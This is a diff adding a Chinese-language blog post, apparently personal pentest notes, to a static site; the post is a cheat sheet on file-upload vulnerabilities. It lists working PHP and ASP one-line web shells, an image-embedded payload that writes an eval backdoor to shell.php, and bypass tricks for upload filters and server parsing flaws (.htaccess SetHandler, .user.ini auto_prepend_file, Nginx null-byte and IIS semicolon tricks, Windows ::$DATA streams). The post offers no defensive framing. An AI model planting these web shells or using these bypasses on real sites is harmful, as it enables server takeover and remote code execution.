@@ -149,7 +149,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">4</span>
+          <span class="site-state-item-count">5</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -185,6 +185,88 @@
     </div>
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/01/15/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/apple-touch-icon-next.png">
+      <meta itemprop="name" content="清者">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="The future is promising">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | The future is promising">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2023/01/15/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="post-title-link" itemprop="url">文件上传</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2023-01-15 18:34:11 / 修改时间：19:18:27" itemprop="dateCreated datePublished" datetime="2023-01-15T18:34:11+08:00">2023-01-15</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h2 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h2><h3 id="PHP一句话木马"><a href="#PHP一句话木马" class="headerlink" title="PHP一句话木马"></a>PHP一句话木马</h3><?php eval ($_POST[cmd]);?>
+<?php assert ($_POST[cmd]);?>
+<p>cmd为自行设定的密码</p>
+<h3 id="asp一句话木马"><a href="#asp一句话木马" class="headerlink" title="asp一句话木马"></a>asp一句话木马</h3><p>&lt;%eval request(“caidao”)%&gt;</p>
+<h2 id="文件上传点"><a href="#文件上传点" class="headerlink" title="文件上传点"></a>文件上传点</h2><p>头像，网站logo，插件管理，水印图片处等<br>任何可以上传文件的地方，都可能存在文件上传漏洞</p>
+<h2 id="黑名单过滤"><a href="#黑名单过滤" class="headerlink" title="黑名单过滤"></a>黑名单过滤</h2><h3 id="畸形后缀名"><a href="#畸形后缀名" class="headerlink" title="畸形后缀名"></a>畸形后缀名</h3><p>php,php3,php4,php5,php7,pht,phtml,phar,phps,Asp,aspx,cer,cdx,asa,asax,jsp,jspa,jspx</p>
+<h3 id="windows特性绕过"><a href="#windows特性绕过" class="headerlink" title="windows特性绕过"></a>windows特性绕过</h3><p>大小写绕过<br>windows空格绕过<br>windows后缀点绕过<br>windows文件流绕过：上传shell.php::$DATA</p>
+<h2 id="白名单过滤"><a href="#白名单过滤" class="headerlink" title="白名单过滤"></a>白名单过滤</h2><p>00截断<br>解析漏洞<br>文件包含<br>条件竞争上传</p>
+<h2 id="Apache解析漏洞"><a href="#Apache解析漏洞" class="headerlink" title="Apache解析漏洞"></a>Apache解析漏洞</h2><p>.htaccess<br>htaccess是一个完整的文件名，不仅仅是文件的扩展名<br>如.htaccess的代码如下：<br>&lt;FilesMatch”1.jpg”&gt;<br>SetHandler application/x-httpd-php<br></FilesMatch></p>
+<h2 id="Nginx解析漏洞"><a href="#Nginx解析漏洞" class="headerlink" title="Nginx解析漏洞"></a>Nginx解析漏洞</h2><h3 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h3><p>上传文件名如：1.jpg空格<br>访问例如：1.jpg…php<br>访问的时候抓包，修改后缀为1.jpg[0x20][0x00][0x2e]php (使用burp修改，调整hex即可)<br>修改后进行访问就会发现jpg图片会被当做php解析</p>
+<h2 id="使用-user-ini绕过黑名单"><a href="#使用-user-ini绕过黑名单" class="headerlink" title="使用.user.ini绕过黑名单"></a>使用.user.ini绕过黑名单</h2><h3 id="使用方式"><a href="#使用方式" class="headerlink" title="使用方式"></a>使用方式</h3><p>上传一张图片<br>上传.user.ini文件内容为：auto_prepend_file=1.png<br>访问<a target="_blank" rel="noopener" href="http://ip/upload/2.php/xx.php(%E7%9B%AE%E5%BD%95%E4%B8%AD%E5%AD%98%E5%9C%A8%E7%9A%84%E4%B8%80%E4%B8%AAphp%E6%96%87%E4%BB%B6)">http://IP/upload/2.php/xx.php(目录中存在的一个php文件)</a></p>
+<h2 id="IIS解析漏洞"><a href="#IIS解析漏洞" class="headerlink" title="IIS解析漏洞"></a>IIS解析漏洞</h2><p>目录解析<br><a target="_blank" rel="noopener" href="http://www.xxx.com/xx.asp/xx.jpg">www.xxx.com/xx.asp/xx.jpg</a><br>文件解析<br><a target="_blank" rel="noopener" href="http://www.xxx.com/xx.asp;.jpg">www.xxx.com/xx.asp;.jpg</a><br>我们把下面的代码，插入到一张图片中<br><?php fputs(fopen('shell.php','w'),'<?php @eval($_POST[x])?>‘)?&gt;<br>那么，访问x.x.x/upload/1.jpg/.php,就会在当前目录生成一个木马</p>
+<h2 id="Apache解析漏洞-1"><a href="#Apache解析漏洞-1" class="headerlink" title="Apache解析漏洞"></a>Apache解析漏洞</h2><p>在一个后端黑名单判断的文件上传中<br>当Apache版本比较老是就可以用如：1.php.aaaaaaaaaaaaaaaaaaa………的方式进行绕过</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
